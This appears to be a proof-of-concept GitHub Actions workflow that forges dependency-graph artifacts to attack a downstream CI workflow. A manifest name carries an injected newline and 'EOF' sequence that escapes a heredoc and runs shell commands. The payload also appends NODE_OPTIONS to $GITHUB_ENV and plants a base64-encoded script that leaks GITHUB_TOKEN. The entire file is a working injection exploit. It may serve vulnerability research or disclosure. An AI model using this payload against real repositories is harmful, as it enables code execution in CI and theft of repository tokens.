name: PR Workflow

on:
  pull_request:

permissions:
  contents: read

jobs:
  forged:
    runs-on: ubuntu-latest
    steps:
      - name: Build forged dependency graph artifact
        env:
          BASE_SHA: ${{ github.event.pull_request.base.sha }}
          HEAD_SHA: ${{ github.event.pull_request.head.sha }}
          PR_NUM: ${{ github.event.pull_request.number }}
        run: |
          mkdir -p dependency-graph-reports
          python3 - <<'PY'
          import json, os
          base = os.environ["BASE_SHA"]
          head = os.environ["HEAD_SHA"]
          n = os.environ["PR_NUM"]
          evil = (
              "x\n"
              "EOF\n"
              "id; uname -srm; echo GAB_RCE_PROOF; head -c 200 \"$GITHUB_EVENT_PATH\"; echo\n"
              "printf '%s\\n' 'NODE_OPTIONS=--require /tmp/gab_evil.js' | tee -a \"$GITHUB_ENV\"\n"
              "printf '%s' 'Y29uc29sZS5lcnJvcigiR0FCX1RPS0VOX0xFQUs9IisocHJvY2Vzcy5lbnYuR0lUSFVCX1RPS0VOfHwibm9uZSIpKTs=' | base64 -d | tee /tmp/gab_evil.js\n"
              "exit 0\n"
              "#"
          )

          def snap(sha, ref, manifests):
              return {
                  "version": 0,
                  "sha": sha,
                  "ref": ref,
                  "job": {"correlator": "gab-rce-poc", "id": "poc"},
                  "detector": {"name": "gab-rce-detector", "version": "1.0.0", "url": "https://example.com"},
                  "scanned": "2026-10-30T00:00:00Z",
                  "manifests": manifests,
              }

          def man(name, purls, loc):
              return {
                  "name": name,
                  "file": {"source_location": loc},
                  "resolved": {
                      p: {"package_url": p, "relationship": "direct", "scope": "runtime", "dependencies": []}
                      for p in purls
                  },
              }

          base_man = {"build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle")}
          head_man = {
              "build.gradle": man("build.gradle", ["pkg:maven/com.example/base@1.0.0"], "build.gradle"),
              evil: man(evil, ["pkg:maven/com.example/zzz@1.0.0"], evil),
          }
          json.dump(snap(base, "refs/heads/main", base_man), open("dependency-graph-reports/poc-base.json", "w"))
          json.dump(snap(head, "refs/pull/%s/merge" % n, head_man), open("dependency-graph-reports/poc-head.json", "w"))
          print("forged payload written")
          PY
          echo keep > keep.txt
      - name: Upload forged artifact
        uses: actions/upload-artifact@v4
        with:
          name: dependency-graph_poc.json
          path: |
            dependency-graph-reports/poc-base.json
            dependency-graph-reports/poc-head.json
            keep.txt
